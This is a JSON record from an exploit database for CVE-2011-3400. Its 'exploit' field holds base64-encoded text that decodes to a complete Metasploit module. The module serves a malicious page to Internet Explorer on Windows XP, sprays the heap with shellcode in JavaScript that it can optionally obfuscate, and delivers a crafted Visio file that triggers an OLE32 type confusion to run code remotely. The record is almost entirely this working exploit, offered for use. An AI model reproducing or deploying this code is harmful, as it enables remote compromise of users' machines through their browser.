{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gTm9ybWFsUmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCgkJc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICAgPT4gIk1pY3Jvc29mdCBXaW5kb3dzIE9MRSBPYmplY3QgRmlsZSBIYW5kbGluZyBSZW1vdGUgQ29kZSBFeGVjdXRpb24iLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB0eXBlIGNvbmZ1c2lvbiB2dWxuZXJhYmlsaXR5IGluIHRoZSBPTEUzMiBjb21wb25lbnQgb2YNCgkJCQlXaW5kb3dzIFhQIFNQMy4gVGhlIHZ1bG5lcmFiaWxpdHkgZXhpc3RzIGluIHRoZSBDUHJvcGVydHlTdG9yYWdlOjpSZWFkTXVsdGlwbGUNCgkJCQlmdW5jdGlvbi4NCg0KCQkJCUEgVmlzaW8gZG9jdW1lbnQgd2l0aCBhIHNwZWNpYWxseSBjcmFmdGVkIFN1bW1hcnkgSW5mb3JtYXRpb24gU3RyZWFtIGVtYmVkZGVkIGFsbG93cw0KCQkJCXRvIGdldCByZW1vdGUgY29kZSBleGVjdXRpb24gdGhyb3VnaCBJbnRlcm5ldCBFeHBsb3Jlciwgb24gc3lzdGVtcyB3aXRoIFZpc2lvIFZpZXdlcg0KCQkJCWluc3RhbGxlZC4NCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ0x1aWdpIEF1cmllbW1hJywgIyBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyeSBhbmQgUG9DDQoJCQkJCSdqdWFuIHZhenF1ZXonICMgTWV0YXNwbG9pdCBtb2R1bGUNCgkJCQldLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQ1ZFJywgJzIwMTEtMzQwMCcgXSwNCgkJCQkJWyAnT1NWREInLCAnNzc2NjMnXSwNCgkJCQkJWyAnQklEJywgJzUwOTc3JyBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL2FsdWlnaS5vcmcvYWR2L29sZTMyXzEtYWR2LnR4dCcgXSwNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly93d3cudmVyaXNpZ25pbmMuY29tL2VuX1VTL3Byb2R1Y3RzLWFuZC1zZXJ2aWNlcy9uZXR3b3JrLWludGVsbGlnZW5jZS1hdmFpbGFiaWxpdHkvaWRlZmVuc2UvcHVibGljLXZ1bG5lcmFiaWxpdHktcmVwb3J0cy9hcnRpY2xlcy9pbmRleC54aHRtbD9pZD05NjYnIF0NCgkJCQldLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ1NwYWNlJyAgICA9PiAxMDAwLA0KCQkJCQknQmFkQ2hhcnMnID0+ICJceDAwIiwNCgkJCQkJJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQoJCQkJfSwNCgkJCSdEZWZhdWx0T3B0aW9ucycgID0+DQoJCQkJew0KCQkJCQknSW5pdGlhbEF1dG9SdW5TY3JpcHQnID0+ICdtaWdyYXRlIC1mJw0KCQkJCX0sDQoJCQknUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQXV0b21hdGljJywge30gXSwNCgkJCQkJWw0KCQkJCQkJJ0lFIDYgb24gV2luZG93cyBYUCBTUDMgLyBWaXNpbyBWaWV3ZXIgMjAxMCcsDQoJCQkJCQl7DQoJCQkJCQkJJ09mZnNldCcgICAgPT4gJzB4N2VlIC0gY29kZS5sZW5ndGgnLA0KCQkJCQkJCSdQdHJUb0hlYXAnID0+ICJceDM1XHg0MCIgIyBQb2ludGVyIGZyb20gSUVYUExPUkUuZXhlIFBFIGhlYWRlcg0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbDQoJCQkJCQknSUUgNyBvbiBXaW5kb3dzIFhQIFNQMyAvIFZpc2lvIFZpZXdlciAyMDEwJywNCgkJCQkJCXsNCgkJCQkJCQknT2Zmc2V0JyAgICA9PiAnMHg3ZWUgLSBjb2RlLmxlbmd0aCcsDQoJCQkJCQkJJ1B0clRvSGVhcCcgPT4gIlx4MzVceDQwIiAjIFBvaW50ZXIgZnJvbSBJRVhQTE9SRS5leGUgUEUgaGVhZGVyDQoJCQkJCQl9DQoJCQkJCV0NCgkJCQldLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gIkRlYyAxMyAyMDExIiwNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHRCb29sLm5ldygnT0JGVVNDQVRFJywgW2ZhbHNlLCAnRW5hYmxlIEphdmFTY3JpcHQgb2JmdXNjYXRpb24nLCBmYWxzZV0pDQoJCQldLCBzZWxmLmNsYXNzKQ0KDQoJZW5kDQoNCglkZWYgZ2V0X3RhcmdldChhZ2VudCkNCgkJIyBJZiB0aGUgdXNlciBpcyBhbHJlYWR5IHNwZWNpZmllZCBieSB0aGUgdXNlciwgd2UnbGwganVzdCB1c2UgdGhhdA0KCQlyZXR1cm4gdGFyZ2V0IGlmIHRhcmdldC5uYW1lICE9ICdBdXRvbWF0aWMnDQoNCgkJaWYgYWdlbnQgPX4gL05UIDVcLjEvIGFuZCBhZ2VudCA9fiAvTVNJRSA2Lw0KCQkJcmV0dXJuIHRhcmdldHNbMV0gICMgSUUgNiBvbiBXaW5kb3dzIFhQIFNQMw0KCQllbHNpZiBhZ2VudCA9fiAvTlQgNVwuMS8gYW5kIGFnZW50ID1+IC9NU0lFIDcvDQoJCQlyZXR1cm4gdGFyZ2V0c1syXSAgIyBJRSA3IG9uIFdpbmRvd3MgWFAgU1AzDQoJCWVsc2UNCgkJCXJldHVybiBuaWwNCgkJZW5kDQoJZW5kDQoNCglkZWYgZXhwbG9pdA0KCQlAdnNkID0gY3JlYXRlX3ZzZA0KCQlzdXBlcg0KCWVuZA0KDQoJZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxdWVzdCkNCg0KCQlhZ2VudCA9IHJlcXVlc3QuaGVhZGVyc1snVXNlci1BZ2VudCddDQoJCW15X3RhcmdldCA9IGdldF90YXJnZXQoYWdlbnQpDQoNCgkJIyBBdm9pZCB0aGUgYXR0YWNrIGlmIHRoZSB2aWN0aW0gZG9lc24ndCBoYXZlIHRoZSBzYW1lIHNldHVwIHdlJ3JlIHRhcmdldGluZw0KCQlpZiBteV90YXJnZXQubmlsPw0KCQkJcHJpbnRfZXJyb3IoIkJyb3dzZXIgbm90IHN1cHBvcnRlZDogI3thZ2VudH0iKQ0KCQkJc2VuZF9ub3RfZm91bmQoY2xpKQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCXByaW50X3N0YXR1cygiQ2xpZW50IHJlcXVlc3Rpbmc6ICN7cmVxdWVzdC51cml9IikNCg0KCQlpZiByZXF1ZXN0LnVyaSA9fiAvXC52c2QkLw0KCQkJQHZzZFs1MTA2LCAyXSA9IG15X3RhcmdldFsnUHRyVG9IZWFwJ10NCgkJCXByaW50X3N0YXR1cygiU2VuZGluZyBFeHBsb2l0IFZTRCIpDQoJCQlzZW5kX3Jlc3BvbnNlKGNsaSwgQHZzZCwgeyAnQ29udGVudC1UeXBlJyA9PiAnYXBwbGljYXRpb24vdm5kLnZpc2lvJyB9KQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCXAgPSBwYXlsb2FkLmVuY29kZWQNCg0KCQlqc19jb2RlID0gUmV4OjpUZXh0LnRvX3VuZXNjYXBlKHAsIFJleDo6QXJjaC5lbmRpYW4obXlfdGFyZ2V0LmFyY2gpKQ0KCQlqc19ub3BzID0gUmV4OjpUZXh0LnRvX3VuZXNjYXBlKCJceDBjIio0LCBSZXg6OkFyY2guZW5kaWFuKG15X3RhcmdldC5hcmNoKSkNCg0KCQlqc19waXZvdCA9IDw8LUpTDQoJCXZhciBoZWFwX29iaiA9IG5ldyBoZWFwTGliLmllKDB4MjAwMDApOw0KCQl2YXIgY29kZSA9IHVuZXNjYXBlKCIje2pzX2NvZGV9Iik7DQoJCXZhciBub3BzID0gdW5lc2NhcGUoIiN7anNfbm9wc30iKTsNCg0KCQl3aGlsZSAobm9wcy5sZW5ndGggPCAweDgwMDAwKSBub3BzICs9IG5vcHM7DQoJCXZhciBvZmZzZXQgPSBub3BzLnN1YnN0cmluZygwLCAje215X3RhcmdldFsnT2Zmc2V0J119KTsNCgkJdmFyIHNoZWxsY29kZSA9IG9mZnNldCArIGNvZGUgKyBub3BzLnN1YnN0cmluZygwLCAweDgwMC1jb2RlLmxlbmd0aC1vZmZzZXQubGVuZ3RoKTsNCg0KCQl3aGlsZSAoc2hlbGxjb2RlLmxlbmd0aCA8IDB4NDAwMDApIHNoZWxsY29kZSArPSBzaGVsbGNvZGU7DQoJCXZhciBibG9jayA9IHNoZWxsY29kZS5zdWJzdHJpbmcoMCwgKDB4ODAwMDAtNikvMik7DQoNCgkJaGVhcF9vYmouZ2MoKTsNCgkJZm9yICh2YXIgaT0xOyBpIDwgMHgxZTA7IGkrKykgew0KCQkJaGVhcF9vYmouYWxsb2MoYmxvY2spOw0KCQl9DQoJCUpTDQoNCgkJanNfcGl2b3QgPSBoZWFwbGliKGpzX3Bpdm90LCB7Om5vb2JmdSA9PiB0cnVlfSkNCg0KCQlpZiBkYXRhc3RvcmVbJ09CRlVTQ0FURSddDQoJCQlqc19waXZvdCA9IDo6UmV4OjpFeHBsb2l0YXRpb246OkpTT2JmdS5uZXcoanNfcGl2b3QpDQoJCQlqc19waXZvdC5vYmZ1c2NhdGUNCgkJZW5kDQoNCgkJdnNkX3VyaSA9ICgnLycgPT0gZ2V0X3Jlc291cmNlWy0xLDFdKSA/IGdldF9yZXNvdXJjZVswLCBnZXRfcmVzb3VyY2UubGVuZ3RoLTFdIDogZ2V0X3Jlc291cmNlDQoJCXZzZF91cmkgPDwgIi8je3JhbmRfdGV4dF9hbHBoYShyYW5kKDYpKzMpfS52c2QiDQoNCgkJaHRtbCA9ICVRfA0KCQk8aHRtbD4NCgkJPGhlYWQ+DQoJCTxzY3JpcHQ+DQoJCSN7anNfcGl2b3R9DQoJCTwvc2NyaXB0Pg0KCQk8L2hlYWQ+DQoJCTxib2R5Pg0KDQoJCTxvYmplY3QgY2xhc3NpZD0iY2xzaWQ6RjhDRjdBOTgtMkM0NS00YzhkLTkxNTEtMkQ3MTY5ODlEREFCIiBJRD0idGFyZ2V0Ij4NCgkJPHBhcmFtIG5hbWU9c3JjIHZhbHVlPSIje3ZzZF91cml9Ij4NCgkJPC9vYmplY3Q+DQoJCTwvYm9keT4NCgkJPC9odG1sPg0KCQl8DQoNCgkJaHRtbCA9IGh0bWwuZ3N1YigvXlx0XHQvLCAnJykNCg0KCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgaHRtbCIpDQoJCXNlbmRfcmVzcG9uc2UoY2xpLCBodG1sLCB7J0NvbnRlbnQtVHlwZSc9Pid0ZXh0L2h0bWwnfSkNCgllbmQNCg0KCWRlZiBjcmVhdGVfdnNkDQoJCXBhdGggPSA6OkZpbGUuam9pbiggTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAxMS0zNDAwIiwgIkNWRS0yMDExLTM0MDAudnNkIiApDQoJCWZkID0gOjpGaWxlLm9wZW4oIHBhdGgsICJyYiIgKQ0KCQl2c2QgPSBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkNCgkJZmQuY2xvc2UNCgkJcmV0dXJuIHZzZA0KCWVuZA0KDQplbmQ=", 
    "filename": "platforms/windows/remote/19002.rb", 
    "id": "19002", 
    "cves": [
        "CVE-2011-3400"
    ]
}